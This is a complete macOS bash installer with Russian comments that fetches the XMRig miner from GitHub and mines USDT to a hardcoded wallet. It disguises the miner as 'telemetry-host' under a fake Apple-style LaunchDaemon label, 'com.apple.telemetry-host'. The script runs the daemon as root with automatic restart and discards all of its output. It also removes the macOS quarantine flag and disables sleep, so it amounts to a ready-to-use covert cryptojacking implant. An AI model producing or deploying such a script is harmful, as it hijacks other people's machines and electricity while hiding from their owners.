#!/bin/bash
set -e

# === НАСТРОЙКИ ===
COIN="USDT"
WALLET="0xbD4a36e73BDa8B0f50689d60528c698FA05b6005"
REF_CODE="rbi3-l12f"
POOL="rx.unmineable.com:3333"
MAX_CPU_USAGE=60

INSTALL_DIR="/Library/Application Support/SysWorker"
BIN_NAME="telemetry-host"
BIN_PATH="$INSTALL_DIR/$BIN_NAME"
PLIST_PATH="/Library/LaunchDaemons/com.apple.telemetry-host.plist"
XMRIG_VER="6.27.0"
# =================

ARCH=$(uname -m)
if [ "$ARCH" = "arm64" ]; then
    ASSET="xmrig-${XMRIG_VER}-macos-arm64.tar.gz"
elif [ "$ARCH" = "x86_64" ]; then
    ASSET="xmrig-${XMRIG_VER}-macos-x64.tar.gz"
else
    echo "Неподдерживаемая архитектура: $ARCH"
    exit 1
fi

RAW_HOST=$(scutil --get ComputerName 2>/dev/null || hostname -s)
WORKER_NAME=$(echo "$RAW_HOST" | tr -cd 'a-zA-Z0-9_-')
[ -z "$WORKER_NAME" ] && WORKER_NAME="MacBook"

USER_STR="${COIN}:${WALLET}.${WORKER_NAME}"
if [ -n "$REF_CODE" ]; then
    USER_STR="${USER_STR}#${REF_CODE}"
fi

# Запрещаем сон при питании от сети (ac), чтобы работал при закрытой крышке на зарядке
sudo pmset -c sleep 0 disksleep 0 displaysleep 10

sudo mkdir -p "$INSTALL_DIR"
sudo launchctl bootout system "$PLIST_PATH" 2>/dev/null || true
sudo pkill -x "$BIN_NAME" 2>/dev/null || true
sudo pkill -x "xmrig" 2>/dev/null || true

TMP_DIR=$(mktemp -d)
URL="https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VER}/${ASSET}"
curl -fsSL "$URL" -o "$TMP_DIR/xmrig.tar.gz"
tar -xzf "$TMP_DIR/xmrig.tar.gz" -C "$TMP_DIR"

FOUND_BIN=$(find "$TMP_DIR" -type f -name "xmrig" | head -n 1)
if [ -z "$FOUND_BIN" ]; then
    rm -rf "$TMP_DIR"
    echo "Не найден бинарник xmrig в архиве"
    exit 1
fi

sudo cp "$FOUND_BIN" "$BIN_PATH"
sudo chmod +x "$BIN_PATH"
sudo xattr -dr com.apple.quarantine "$INSTALL_DIR" 2>/dev/null || true
rm -rf "$TMP_DIR"

cat << EOFCFG | sudo tee "$INSTALL_DIR/config.json" > /dev/null
{
    "autosave": true,
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "max-threads-hint": ${MAX_CPU_USAGE},
        "priority": 1
    },
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "url": "${POOL}",
            "user": "${USER_STR}",
            "pass": "x",
            "keepalive": true,
            "tls": false
        }
    ]
}
EOFCFG

cat << EOFPLIST | sudo tee "$PLIST_PATH" > /dev/null
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.telemetry-host</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/caffeinate</string>
        <string>-s</string>
        <string>${BIN_PATH}</string>
        <string>-c</string>
        <string>${INSTALL_DIR}/config.json</string>
    </array>
    <key>WorkingDirectory</key>
    <string>${INSTALL_DIR}</string>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
</dict>
</plist>
EOFPLIST

sudo chown root:wheel "$PLIST_PATH"
sudo chmod 644 "$PLIST_PATH"
sudo launchctl bootstrap system "$PLIST_PATH"
sudo launchctl kickstart -k system/com.apple.telemetry-host

sleep 2
echo "Готово. Воркер: $WORKER_NAME ($ARCH, ${MAX_CPU_USAGE}% CPU)"
pgrep -fl "$BIN_NAME" || true
